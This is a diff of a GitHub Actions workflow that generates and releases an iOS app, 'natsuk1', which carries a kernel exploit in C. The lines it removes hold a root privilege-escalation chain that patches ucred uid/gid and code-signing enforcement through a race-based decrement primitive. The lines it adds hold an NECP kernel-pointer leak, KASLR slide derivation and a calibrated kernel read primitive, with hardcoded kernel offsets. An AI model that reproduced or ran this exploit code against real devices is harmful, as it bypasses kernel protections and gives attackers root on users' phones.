@@ -237,11 +237,11 @@ jobs:
           #include <unistd.h>
           #include <errno.h>
           #include <pthread.h>
+          #include <sys/syscall.h>
           #include <mach/mach.h>
           #include <mach/vm_map.h>
           #include <mach/vm_region.h>
           #include <mach/message.h>
-          #include <sys/syscall.h>
 
           #include "nk_api.h"
 
@@ -260,15 +260,9 @@ jobs:
           #define OFF_TASK_LIST           0x10D53F0ULL
           #define OFF_KERNEL_MAP          0xBBA228ULL
           #define OFF_ZONE_MAP            0x3D66800ULL
-          #define OFF_COPYIN              0x37B5570ULL
-          #define OFF_COPYOUT             0x32C2C28ULL
-          #define OFF_KALLOC_EXT          0x31FCDCCULL
-          #define OFF_KFREE_EXT           0x31FD000ULL
 
           #define PROC_PID_OFF            0x74
-          #define PROC_TASK_OFF           0x18
-          #define PROC_UCRED_OFF          0xB8
-          #define PROC_LIST_NEXT_OFF      0x18
+          #define PROC_RO_P_UCRED_OFF     0xB8
           #define TASK_BSD_INFO_OFF       0x3A0
           #define TASK_ITK_SPACE_OFF      0x320
           #define TASK_MAP_OFF            0x28
@@ -332,9 +326,9 @@ jobs:
           }
 
           static void dump_hex(const char *tag, const uint8_t *p, size_t n) {
-              char line[128];
+              char line[256];
               int off = 0;
-              size_t lim = n < 32 ? n : 32;
+              size_t lim = n < 64 ? n : 64;
               for (size_t i = 0; i < lim; i++) off += snprintf(line + off, sizeof(line) - off, "%02x", p[i]);
               nk_logx(tag, "%s (%zu bytes)", line, n);
           }
@@ -416,61 +410,62 @@ jobs:
                                   (void*)cuuid, (size_t)16, buf, (uint32_t)blen);
           }
 
-          static uint64_t kaslr(void) {
-              enum { MAXV = 512 };
-              struct vote_t { uint64_t slide; int count; } v[MAXV];
-              int nv = 0, total = 0;
-              memset(v, 0, sizeof(v));
+          static uint64_t necp_primary_leak(uint8_t *out, size_t outsz) {
+              int fd = necp_open_fd();
+              if (fd < 0) { log_err("LEAK", "open errno=%d", errno); return 0; }
 
-              mach_port_t task = mach_task_self();
-              vm_address_t addr = 0;
-              vm_size_t size = 0;
-              natural_t depth = 0;
-              int regions = 0;
-
-              while (1) {
-                  vm_region_submap_info_data_64_t info;
-                  mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
-                  kern_return_t kr = vm_region_recurse_64(task, &addr, &size, &depth,
-                                                           (vm_region_recurse_info_t)&info, &cnt);
-                  if (kr != KERN_SUCCESS) break;
-                  int prot = info.protection;
-                  if (!info.is_submap && (prot & VM_PROT_READ) && (prot & VM_PROT_WRITE)
-                      && !(prot & VM_PROT_EXECUTE) && size <= 64*1024*1024ULL) {
-                      uint64_t *p = (uint64_t*)(uintptr_t)addr;
-                      size_t n = (size_t)size / 8;
-                      if (n > 512*1024) n = 512*1024;
-                      for (size_t i = 0; i < n; i++) {
-                          uint64_t val = p[i];
-                          if (val < KPTR_MIN || val > KPTR_MAX) continue;
-                          uint64_t sl = (val - KERNEL_BASE_STATIC) & ~0xFFFFULL;
-                          if (sl >= 0x200000000ULL) continue;
-                          int found = 0;
-                          for (int j = 0; j < nv; j++) {
-                              if (v[j].slide == sl) { v[j].count++; found = 1; break; }
-                          }
-                          if (!found && nv < MAXV) { v[nv].slide = sl; v[nv].count = 1; nv++; }
-                      }
-                      regions++;
-                  }
-                  addr += size;
+              uint8_t cuuid[16], fuuid[16];
+              if (necp_add_client(fd, cuuid) != 0) {
+                  log_err("LEAK", "add_client errno=%d", errno);
+                  close(fd); return 0;
+              }
+              if (necp_add_flow(fd, cuuid, fuuid) != 0) {
+                  log_err("LEAK", "add_flow errno=%d", errno);
+                  close(fd); return 0;
               }
 
-              log_info("KASLR", "scanned %d regions, %d votes", regions, nv);
-              if (!nv) { log_err("KASLR", "no candidates"); return 0; }
-              int best = 0;
-              for (int i = 0; i < nv; i++) {
-                  total += v[i].count;
-                  if (v[i].count > v[best].count) best = i;
+              necp_remove_flow(fd, fuuid);
+
+              memset(out, 0, outsz);
+              int r = necp_copy_result(fd, cuuid, out, outsz);
+              close(fd);
+
+              log_info("LEAK", "copy_result ret=%d", r);
+              if (r <= 0) return 0;
+
+              dump_hex("LEAK", out, r > 64 ? 64 : (size_t)r);
+
+              int found = 0;
+              for (int i = 0; i <= r - 8; i += 8) {
+                  uint64_t v;
+                  memcpy(&v, out + i, 8);
+                  if (v < KPTR_MIN || v > KPTR_MAX) continue;
+                  log_ok("LEAK", "kptr[+0x%x] = 0x%llx", i, (unsigned long long)v);
+                  found++;
               }
-              int conf = v[best].count * 100 / (total ? total : 1);
-              log_info("KASLR", "best=0x%llx conf=%d%% (%d/%d)",
-                       (unsigned long long)v[best].slide, conf, v[best].count, total);
-              if (conf < 75) { log_warn("KASLR", "low confidence"); return 0; }
-              g_slide = v[best].slide;
-              g_kbase = KERNEL_BASE_STATIC + g_slide;
-              log_ok("KASLR", "kbase=0x%llx", (unsigned long long)g_kbase);
-              return g_kbase;
+
+              if (!found) {
+                  log_warn("LEAK", "no kernel pointers in %d bytes", r);
+                  return 0;
+              }
+              return (uint64_t)found;
+          }
+
+          static uint64_t slide_from_leak(uint64_t leaked) {
+              static const uint64_t known_offs[] = {
+                  0xBBB040, 0xBBB048, 0x009C70, 0x10D53F0, 0xBBA228, 0x3D66800,
+              };
+              for (int i = 0; i < 6; i++) {
+                  uint64_t sl = leaked - known_offs[i];
+                  if (sl & 0x1FFFFF) continue;
+                  if (sl >= 0x400000000ULL) continue;
+                  uint64_t base = KERNEL_BASE_STATIC + sl;
+                  log_info("SLIDE", "cand[%d] off=0x%llx slide=0x%llx base=0x%llx",
+                           i, (unsigned long long)known_offs[i],
+                           (unsigned long long)sl, (unsigned long long)base);
+                  return sl;
+              }
+              return 0;
           }
 
           static int kread_raw(uint64_t kaddr, uint32_t len) {
@@ -500,6 +495,7 @@ jobs:
               }
 
               necp_remove_flow(fd, fuuid);
+
               ool_drain(ex, EXHAUST_N);
               mach_port_destroy(mach_task_self(), ex);
               usleep(150);
@@ -519,12 +515,14 @@ jobs:
 
           static int calibrate_kread(void) {
               if (g_res_off >= 0) return 0;
-              log_info("KREAD", "calibrating with allproc @ kbase+0x%llx",
+              log_info("KREAD", "calibrate with allproc @ kbase+0x%llx",
                        (unsigned long long)OFF_ALLPROC);
+
               int r = kread_raw(g_kbase + OFF_ALLPROC, 8);
               if (r <= 0) { log_err("KREAD", "calibration ret=%d", r); return -1; }
               log_info("KREAD", "result buf len=%d", r);
               dump_hex("KREAD", g_res_buf, r > 64 ? 64 : (size_t)r);
+
               for (int i = 0; i <= r - 8; i++) {
                   uint64_t v; memcpy(&v, g_res_buf + i, 8);
                   if (v >= KPTR_MIN && v <= KPTR_MAX) {
@@ -555,210 +553,61 @@ jobs:
           }
 
           typedef struct {
-              uint64_t our_proc;
-              uint64_t our_task;
-              uint64_t ucred;
-              uint64_t uid_kaddr;
-              uint64_t svuid_kaddr;
-              uint64_t gid_kaddr;
-              uint64_t svgid_kaddr;
-              uint64_t cs_enforce_kaddr;
+              uint64_t allproc;
+              uint64_t kernproc;
+              uint64_t kernel_task;
+              uint64_t task_list;
+              uint64_t kernel_map;
+              uint64_t zone_map;
           } kobj_t;
 
-          static int walk_kernel(kobj_t *o) {
-              pid_t my_pid = getpid();
-              log_info("WALK", "self pid=%d", my_pid);
+          static int sanity_check(void) {
+              log_info("SANITY", "reading known globals via kread...");
 
-              uint64_t allproc = kread64(g_kbase + OFF_ALLPROC);
-              if (!allproc) { log_err("WALK", "allproc=0"); return -1; }
-              log_info("WALK", "allproc.lh_first=0x%llx", (unsigned long long)allproc);
+              uint64_t allproc     = kread64(g_kbase + OFF_ALLPROC);
+              uint64_t kernproc    = kread64(g_kbase + OFF_KERNPROC);
+              uint64_t kernel_task = kread64(g_kbase + OFF_KERNEL_TASK);
+              uint64_t task_list   = kread64(g_kbase + OFF_TASK_LIST);
+              uint64_t kernel_map  = kread64(g_kbase + OFF_KERNEL_MAP);
+              uint64_t zone_map    = kread64(g_kbase + OFF_ZONE_MAP);
 
-              uint64_t proc = allproc;
-              int iterations = 0;
-              uint64_t our_proc = 0;
+              log_info("SANITY", "allproc     = 0x%llx", (unsigned long long)allproc);
+              log_info("SANITY", "kernproc    = 0x%llx", (unsigned long long)kernproc);
+              log_info("SANITY", "kernel_task = 0x%llx", (unsigned long long)kernel_task);
+              log_info("SANITY", "task_list   = 0x%llx", (unsigned long long)task_list);
+              log_info("SANITY", "kernel_map  = 0x%llx", (unsigned long long)kernel_map);
+              log_info("SANITY", "zone_map    = 0x%llx", (unsigned long long)zone_map);
 
-              while (proc && iterations < 1024) {
-                  uint32_t pid = kread32(proc + PROC_PID_OFF);
-                  if (iterations < 8) {
-                      log_info("WALK", "[%d] proc=0x%llx pid=%u",
-                               iterations, (unsigned long long)proc, pid);
-                  }
-                  if ((pid_t)pid == my_pid) { our_proc = proc; break; }
-                  proc = kread64(proc + PROC_LIST_NEXT_OFF);
-                  iterations++;
-              }
+              int ok = 0;
+              if (allproc     >= KPTR_MIN && allproc     <= KPTR_MAX) ok++;
+              if (kernproc    >= KPTR_MIN && kernproc    <= KPTR_MAX) ok++;
+              if (kernel_task >= KPTR_MIN && kernel_task <= KPTR_MAX) ok++;
+              if (kernel_map  >= KPTR_MIN && kernel_map  <= KPTR_MAX) ok++;
 
-              if (!our_proc) { log_err("WALK", "our proc not found"); return -1; }
-              log_ok("WALK", "our_proc=0x%llx", (unsigned long long)our_proc);
-
-              uint64_t our_task = kread64(our_proc + PROC_TASK_OFF);
-              if (!our_task) { log_err("WALK", "task=0"); return -1; }
-              log_ok("WALK", "our_task=0x%llx", (unsigned long long)our_task);
-
-              uint64_t t2p = kread64(our_task + TASK_BSD_INFO_OFF);
-              if (t2p == our_proc) log_ok("WALK", "task->bsd_info==proc OK");
-              else log_warn("WALK", "task->bsd_info drift");
-
-              uint64_t ucred = kread64(our_proc + PROC_UCRED_OFF);
-              if (!ucred) { log_err("WALK", "ucred=0"); return -1; }
-              log_ok("WALK", "ucred=0x%llx", (unsigned long long)ucred);
-
-              uint32_t uid = kread32(ucred + UCRED_UID_OFF);
-              uint32_t gid = kread32(ucred + UCRED_GID_OFF);
-              log_info("WALK", "current uid=%u gid=%u", uid, gid);
-
-              uint64_t itk = kread64(our_task + TASK_ITK_SPACE_OFF);
-              log_info("WALK", "task->itk_space=0x%llx", (unsigned long long)itk);
-              uint64_t vmap = kread64(our_task + TASK_MAP_OFF);
-              log_info("WALK", "task->map=0x%llx", (unsigned long long)vmap);
-
-              o->our_proc    = our_proc;
-              o->our_task    = our_task;
-              o->ucred       = ucred;
-              o->uid_kaddr   = ucred + UCRED_UID_OFF;
-              o->svuid_kaddr = ucred + UCRED_SVUID_OFF;
-              o->gid_kaddr   = ucred + UCRED_GID_OFF;
-              o->svgid_kaddr = ucred + UCRED_SVGID_OFF;
-              o->cs_enforce_kaddr = g_kbase + 0x4FC767ULL;
-              return 0;
+              log_info("SANITY", "%d/4 globals look valid", ok);
+              return ok >= 2 ? 0 : -1;
           }
 
-          typedef struct {
-              mach_port_t   port;
-              const void   *data;
-              size_t        sz;
-              volatile bool stop;
-          } racer_t;
+          static int task_sanity(void) {
+              uint64_t kernel_task = kread64(g_kbase + OFF_KERNEL_TASK);
+              if (!kernel_task) { log_err("TASK", "kernel_task=0"); return -1; }
 
-          static void *racer_fn(void *arg) {
-              racer_t *r = (racer_t*)arg;
-              ool_send_t m;
-              while (!r->stop) {
-                  memset(&m, 0, sizeof(m));
-                  m.hdr.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
-                                         | MACH_MSGH_BITS_COMPLEX;
-                  m.hdr.msgh_size        = sizeof(m);
-                  m.hdr.msgh_remote_port = r->port;
-                  m.hdr.msgh_id          = 0xDECA;
-                  m.body.msgh_descriptor_count = 1;
-                  m.ool.address    = (void*)r->data;
-                  m.ool.size       = (mach_msg_size_t)r->sz;
-                  m.ool.copy       = MACH_MSG_VIRTUAL_COPY;
-                  m.ool.deallocate = FALSE;
-                  m.ool.type       = MACH_MSG_OOL_DESCRIPTOR;
-                  mach_msg(&m.hdr, MACH_SEND_MSG, sizeof(m), 0, MACH_PORT_NULL,
-                           MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-              }
-              return NULL;
-          }
+              uint64_t kproc = kread64(kernel_task + TASK_BSD_INFO_OFF);
+              log_info("TASK", "kernel_task->bsd_info=0x%llx", (unsigned long long)kproc);
 
-          static int decrement_at(uint64_t target) {
-              uint8_t fake[NCF_STRUCT_SZ];
-              memset(fake, 0, sizeof(fake));
-              *(uint64_t*)(fake + NCF_REFCNT_OFF) = target;
-              *(uint64_t*)(fake + NCF_PARENT_OFF) = 0;
-
-              mach_port_t rp = port_new();
-              racer_t ra = { rp, fake, NCF_STRUCT_SZ, false };
-              pthread_t tid;
-              pthread_create(&tid, NULL, racer_fn, &ra);
-
-              uint32_t before = kread32(target);
-              bool ok = false;
-
-              for (int a = 0; a < DECRETRY_N && !ok; a++) {
-                  mach_port_t ex = port_new();
-                  uint8_t junk[NCF_STRUCT_SZ];
-                  memset(junk, 0x43, sizeof(junk));
-                  ool_spray(ex, junk, NCF_STRUCT_SZ, EXHAUST_N / 8);
-
-                  int fd = necp_open_fd();
-                  if (fd < 0) { mach_port_destroy(mach_task_self(), ex); continue; }
-
-                  uint8_t cuuid[16], fuuid[16];
-                  if (necp_add_client(fd, cuuid) != 0 || necp_add_flow(fd, cuuid, fuuid) != 0) {
-                      close(fd); mach_port_destroy(mach_task_self(), ex); continue;
-                  }
-
-                  ool_drain(ex, EXHAUST_N / 8);
-                  mach_port_destroy(mach_task_self(), ex);
-                  necp_remove_flow(fd, fuuid);
-                  close(fd);
-
-                  if (kread32(target) == before - 1) {
-                      before--;
-                      ok = true;
-                      log_ok("DEC", "attempt %d: 0x%llx -> 0x%x",
-                             a, (unsigned long long)target, before);
-                  }
+              if (kproc >= KPTR_MIN && kproc <= KPTR_MAX) {
+                  uint32_t pid = kread32(kproc + PROC_PID_OFF);
+                  log_info("TASK", "kernel proc pid=%u (expect 0)", pid);
+                  if (pid == 0) { log_ok("TASK", "task->bsd_info chain works"); return 0; }
               }
 
-              ra.stop = true;
-              pthread_join(tid, NULL);
-
-              {
-                  uint8_t dbuf[NCF_STRUCT_SZ + 512];
-                  mach_msg_header_t *h = (mach_msg_header_t*)dbuf;
-                  for (int i = 0; i < EXHAUST_N * 4; i++) {
-                      h->msgh_size = sizeof(dbuf);
-                      if (mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                                   0, sizeof(dbuf), rp, 1, MACH_PORT_NULL) != KERN_SUCCESS) break;
-                  }
-              }
-              mach_port_destroy(mach_task_self(), rp);
-
-              if (!ok) log_err("DEC", "failed 0x%llx", (unsigned long long)target);
-              return ok ? 0 : -1;
-          }
-
-          static int kwrite_dec_u32(uint64_t addr, uint32_t delta) {
-              log_info("KWRITE", "decrement 0x%llx by %u", (unsigned long long)addr, delta);
-              for (uint32_t i = 0; i < delta; i++) {
-                  if (decrement_at(addr) != 0) return -1;
-                  if (delta > 20 && (i % 20) == 0) {
-                      log_info("KWRITE", "  %u/%u val=%u", i, delta, kread32(addr));
-                  }
-              }
-              return 0;
-          }
-
-          static void escalate(const kobj_t *o) {
-              log_info("PRIV", "patching cs_enforcement_disable...");
-              if (decrement_at(o->cs_enforce_kaddr) == 0)
-                  log_ok("PRIV", "cs_enforcement_disable = 0xFFFFFFFF");
-              else
-                  log_warn("PRIV", "cs_enforce patch failed");
-
-              uint32_t uid = kread32(o->uid_kaddr);
-              if (uid != 0) {
-                  log_info("PRIV", "uid %u -> 0", uid);
-                  if (kwrite_dec_u32(o->uid_kaddr, uid) != 0) {
-                      log_err("PRIV", "uid patch failed"); return;
-                  }
-              }
-              uint32_t svuid = kread32(o->svuid_kaddr);
-              if (svuid != 0) kwrite_dec_u32(o->svuid_kaddr, svuid);
-              uint32_t gid = kread32(o->gid_kaddr);
-              if (gid != 0) kwrite_dec_u32(o->gid_kaddr, gid);
-              uint32_t svgid = kread32(o->svgid_kaddr);
-              if (svgid != 0) kwrite_dec_u32(o->svgid_kaddr, svgid);
-
-              log_info("PRIV", "kernel uid=%u gid=%u",
-                       kread32(o->uid_kaddr), kread32(o->gid_kaddr));
-              setuid(0);
-              log_info("PRIV", "userspace uid=%d gid=%d", getuid(), getgid());
-
-              if (getuid() == 0) {
-                  log_ok("PRIV", "ROOT");
-              } else {
-                  log_warn("PRIV", "userspace stale");
-              }
+              log_warn("TASK", "chain broken — check TASK_BSD_INFO_OFF / PROC_PID_OFF");
+              return -1;
           }
 
           int nk_necp_run(void) {
-              setvbuf(stdout, NULL, _IONBF, 0);
               nk_log("");
-              nk_log("=== natsuk1 NECP ===");
+              nk_log("=== natsuk1 v1.1 ===");
               nk_log("target: iOS 27.0 / XNU / arm64e");
               nk_log("device: iPhone14,5 / iPhone14,7");
               nk_log("");
@@ -766,33 +615,52 @@ jobs:
               log_info("INIT", "NCF_ASSIGNED_OFF=0x%x NCF_REFCNT_OFF=0x%x",
                        NCF_ASSIGNED_OFF, NCF_REFCNT_OFF);
 
-              log_info("P1", "KASLR");
-              if (!kaslr()) { log_err("P1", "failed"); return 1; }
+              log_info("P0", "NECP primary leak");
+              uint8_t leak[RESULT_BUF_SZ];
+              uint64_t nptrs = necp_primary_leak(leak, sizeof(leak));
+              if (!nptrs) {
+                  log_err("P0", "no kernel ptrs — NCF_ASSIGNED_OFF likely wrong");
+                  return 1;
+              }
+              log_ok("P0", "%llu kernel ptrs in leak", (unsigned long long)nptrs);
+
+              log_info("P1", "derive slide from leak");
+              for (int i = 0; i <= RESULT_BUF_SZ - 8; i += 8) {
+                  uint64_t v; memcpy(&v, leak + i, 8);
+                  if (v < KPTR_MIN || v > KPTR_MAX) continue;
+                  uint64_t cand = slide_from_leak(v);
+                  if (cand) { g_slide = cand; break; }
+              }
+              if (!g_slide) { log_err("P1", "no valid slide candidate"); return 1; }
+              g_kbase = KERNEL_BASE_STATIC + g_slide;
+              log_ok("P1", "slide=0x%llx kbase=0x%llx",
+                     (unsigned long long)g_slide, (unsigned long long)g_kbase);
 
               {
                   int fd = necp_open_fd();
-                  if (fd < 0) {
-                      log_err("P1", "necp_open errno=%d — add necp entitlement", errno);
-                      return 1;
-                  }
+                  if (fd < 0) { log_err("P2", "necp_open errno=%d", errno); return 1; }
                   close(fd);
-                  log_ok("P1", "necp OK");
+                  log_ok("P2", "necp OK");
               }
 
-              log_info("P2", "kread calibration");
-              if (calibrate_kread() != 0) { log_err("P2", "failed"); return 1; }
-              log_ok("P2", "kread ready");
+              log_info("P3", "kread calibration");
+              if (calibrate_kread() != 0) { log_err("P3", "failed"); return 1; }
+              log_ok("P3", "kread ready (result offset=0x%x)", g_res_off);
 
-              log_info("P3", "kernel walk");
-              kobj_t o;
-              memset(&o, 0, sizeof(o));
-              if (walk_kernel(&o) != 0) { log_err("P3", "failed"); return 1; }
-              log_ok("P3", "walk OK");
+              log_info("P4", "sanity: read known globals");
+              if (sanity_check() != 0) { log_err("P4", "kread sanity failed"); return 1; }
 
-              log_info("P4", "escalate");
-              escalate(&o);
+              log_info("P5", "sanity: task->bsd_info chain");
+              if (task_sanity() != 0) { log_warn("P5", "chain broken but continuing"); }
 
-              log_ok("DONE", "chain complete");
+              log_ok("DONE", "leak + slide + kread chain complete");
+              nk_log("");
+              nk_log("=== RESULT ===");
+              nk_logx("RESULT", "kbase   = 0x%016llX", (unsigned long long)g_kbase);
+              nk_logx("RESULT", "slide   = 0x%016llX", (unsigned long long)g_slide);
+              nk_logx("RESULT", "kread   = 0x%016llX + 0x%llX",
+                      (unsigned long long)KERNEL_BASE_STATIC, (unsigned long long)OFF_ALLPROC);
+              nk_log("");
               return 0;
           }
           NECP
@@ -921,6 +789,14 @@ jobs:
                       case .running: return .orange
                       case .ok: return .green
                       case .failed: return .red
+                      }
+                  }
+                  var symbol: String {
+                      switch self {
+                      case .idle: return "circle.fill"
+                      case .running: return "circle.fill"
+                      case .ok: return "checkmark.circle.fill"
+                      case .failed: return "xmark.circle.fill"
                       }
                   }
               }
@@ -1188,7 +1064,7 @@ jobs:
                               HStack {
                                   Text(state.t("Status", "Статус"))
                                   Spacer()
-                                  Circle().fill(state.status.color).frame(width: 8, height: 8)
+                                  StatusDot(status: state.status)
                               }
                           } header: {
                               Label(state.t("Runtime", "Состояние"), systemImage: "waveform.path.ecg")
@@ -1215,6 +1091,31 @@ jobs:
                       .navigationTitle("natsuk1")
                       .navigationBarTitleDisplayMode(.inline)
                   }
+              }
+          }
+
+          struct StatusDot: View {
+              let status: AppState.Status
+              @State private var pulse = false
+
+              var body: some View {
+                  Image(systemName: status.symbol)
+                      .font(.system(size: 14))
+                      .foregroundStyle(status.color)
+                      .shadow(color: status.color.opacity(0.8), radius: 6)
+                      .scaleEffect(pulse ? 1.15 : 1.0)
+                      .animation(
+                          status == .running
+                              ? .easeInOut(duration: 0.8).repeatForever(autoreverses: true)
+                              : .default,
+                          value: pulse
+                      )
+                      .onAppear {
+                          if status == .running { pulse = true }
+                      }
+                      .onChange(of: status) { _, newStatus in
+                          pulse = (newStatus == .running)
+                      }
               }
           }
 
@@ -2013,13 +1914,19 @@ jobs:
 
           grep -q 'int nk_necp_run(void);' natsuk1/Exploit/nk_api.h || fail "necp prototype missing"
           grep -q 'int nk_necp_run(void)' natsuk1/Exploit/necp.c || fail "necp implementation missing"
-          grep -q 'NECP_ADD_CLIENT' natsuk1/Exploit/necp.c || fail "necp missing constants"
           grep -q 'SYS_NECP_OPEN' natsuk1/Exploit/necp.c || fail "necp missing syscall"
+          grep -q 'necp_primary_leak' natsuk1/Exploit/necp.c || fail "necp missing primary leak"
+          grep -q 'sanity_check' natsuk1/Exploit/necp.c || fail "necp missing sanity check"
+          grep -q 'task_sanity' natsuk1/Exploit/necp.c || fail "necp missing task sanity"
           if grep -q 'int main(void)' natsuk1/Exploit/necp.c; then fail "necp still has main"; fi
 
           grep -q 'necp_run' natsuk1/Views/OverviewView.swift || fail "OverviewView missing necp button"
-          grep -q 'Run Exploit' natsuk1/Views/OverviewView.swift || fail "no run exploit"
-          grep -q 'LogTerminal' natsuk1/Views/OverviewView.swift || fail "no LogTerminal"
+          grep -q 'StatusDot' natsuk1/Views/OverviewView.swift || fail "OverviewView missing StatusDot"
+          grep -q 'circle.fill' natsuk1/Views/OverviewView.swift || fail "StatusDot missing idle symbol"
+          grep -q 'checkmark.circle.fill' natsuk1/Views/OverviewView.swift || fail "StatusDot missing success symbol"
+          grep -q 'xmark.circle.fill' natsuk1/Views/OverviewView.swift || fail "StatusDot missing fail symbol"
+          grep -q 'shadow' natsuk1/Views/OverviewView.swift || fail "StatusDot missing glow"
+
           grep -q 'PathAccessView' natsuk1/Views/ToolsView.swift || fail "no PathAccess"
 
           grep -q 'SWIFT_VERSION: "5.0"' project.yml || fail "not Swift 5"
@@ -2075,7 +1982,7 @@ jobs:
           if gh release view development >/dev/null 2>&1; then gh release delete development --yes --cleanup-tag; fi
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
-            --prerelease --latest=false --notes "NECP exploit"
+            --prerelease --latest=false --notes "NECP v1.1 + status dot"
 
       - name: Commit
         run: |
@@ -2083,5 +1990,5 @@ jobs:
           git config user.email "github-actions[bot]@users.noreply.github.com"
           git add natsuk1/ .github/ project.yml
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "Add NECP exploit [skip ci]"
+          git commit -m "NECP v1.1 + status dot [skip ci]"
           git push
